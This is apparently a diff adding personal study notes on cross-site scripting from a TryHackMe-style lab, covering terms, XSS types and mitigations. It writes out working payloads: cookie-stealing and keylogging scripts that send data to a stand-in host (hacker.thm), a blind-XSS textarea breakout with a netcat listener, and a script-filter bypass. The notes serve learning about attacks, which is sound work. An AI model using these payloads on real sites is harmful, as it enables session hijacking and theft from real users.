@@ -1,0 +1,101 @@
+
+XSS = Cross-Site Scripting
+ - steal sessions, deliver malware, and escalate attacks within a network
+
+Important terms
+- DOM = Document Object Model
+    - structure of a web page
+    - basically a tree of elements (tags, text, attributes)
+    - your JavaScript can read and change it
+- URL parameters = query strings
+    - bits of data in the URL after a '?'
+    - eg. ?id=1&name=John
+    - id parameter with value 1, name with value John
+- Escaping = output encoding
+    - transforming user data 
+      so the browser treats it as plain text
+    - prevents text from being interpreted as code
+    - eg. replacing '<' with '&lt;'
+
+XSS payloads
+ - injected JavaScript code
+ - runs in the victim's browser
+
+ - Intention
+    - steal cookies, log keystrokes, perform actions on behalf of the user
+
+ - Modification
+    - changing payload so that it executes in a specific location
+    - eg. need to escape from an HTML tag or JavaScript block before execution
+
+ - Testing
+    - just a simple payload
+    - eg. <script>alert('XSS')</script>
+    - if vulnerable, there will be a pop-up message
+
+ - Injection points
+    - anywhere that accepts user input
+    - Search fields, Comment sections,
+    - Profile names, Feedback forms
+
+Examples of intentions
+ - Proof of concept (PoC) 
+    - demonstrates the vulnerability
+    - eg. <script>alert('XSS')</script>
+ - Session stealing
+    - steal cookies to impersonate the user
+    - btoa() encodes the cookie value for safe transmission
+    - eg. <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+ - Key logger
+    - records everything a user types on the page
+    -eg. <script>document.onkeypress = function(e) {fetch('https://hacker.thm/log?key=' + btoa(e.key));}</script>
+ - Business Logic Attacks
+    - target specific functionality within the application
+    - example: abusing a company-specific user.changeEmail() function
+    - eg. <script>user.changeEmail('attacker@hacker.thm');</script>
+          
+
+XSS types
+ - Reflected
+    - web app takes user input and immediately displays it on a page without sanitising it
+    example:
+    - we have a website with a search bar
+    - we test it with a payload
+    - <script>alert('Hack')</script>
+    - immediately, the page displays the alert (reflects it)
+
+ - Stored
+    - an application saves attacker-controlled input on the server 
+    - and runs it for every visitor
+    - it is persistent and more dangerous than reflected
+    example:
+    - a textbook example is a guestbook
+    - we comment with <script>alert('You are Hacked')</script>
+    - every visitor sees the alert when they view the guestbook (eg. on refresh)
+
+ - DOM
+    - client-side JavaScript reads attacker-controllable data from the DOM
+    - and writes it back into the page in an unsafe way
+    - the payload never needs to touch the server
+    example:
+    - News Preview page
+    - payload: <img src=x onerror="alert('Hacked you again')">
+ - Blind 
+    - attacker cannot see the result of the attack
+    - eg. sending a payload to a staff member via email or socials
+          the payload executes in some private web portal
+    example:
+    - we have a ticket portal
+    - nc -nlvp 9001
+    - to the ticket content we put a payload
+    - this will extract cookies
+    - we replace the placeholders with our attacker IP and listener PORT 
+    - </textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
+    - in the listener we got the cookie of the visitor
+    
+    
+
+Mitigation techniques
+- sanitizing user input (eg. removing <script> tags)
+- escaping output (eg. replacing < with &lt;)
+- but beware... if you just remove <script> by pattern matching, we can input <sscriptcript>alert('THM');</sscriptcript>
